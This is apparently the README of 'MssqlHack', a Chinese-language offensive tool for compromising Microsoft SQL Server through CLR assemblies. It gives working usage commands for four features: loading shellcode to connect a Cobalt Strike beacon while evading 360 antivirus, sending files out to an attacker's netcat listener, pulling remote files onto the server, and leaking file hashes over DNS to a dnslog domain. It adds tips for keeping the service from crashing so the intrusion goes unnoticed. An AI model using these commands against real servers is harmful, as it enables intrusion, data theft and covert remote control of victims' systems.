# MssqlHack
sqlserver通过clr执行一些基础操作
## 功能：
一、shellcode loader直接上线cs(可bypass360)

**2008和2012的teamserver不能使用profile，不然会导致sqlserver挂掉。**

**2005需要重启服务所以不能用，大于2016内存分配有问题目前也无法使用。**

**最好使用cs4.5，生成shellcode的时候选择退出方式为线程，不然执行exit的时候会导致sqlserver进程退出，导致服务宕机。**
```
exec loader'0','hex shellcode','',''
```
二、 上传文件

**服务器使用nc接收文件**
```
nc -lvvp 8888 >111.izp
```
```
exec loader'1','ip','8888','c:\111.zip'
```
三、下载文件
```
exec loader'3','https://url','c:\users\public\111.zip',''
```
四、计算文件md5

**通过dnslog获取文件md5**
```
exec loader'2','1','dnlsog.cn','c:\users\public\111.zip'
```
**通过将文件md5写入到文件中**
```
exec loader'2','2','c:\users\public\111.txt','c:\users\public\111.zip'
```
## 安装
一句一句执行install.sql
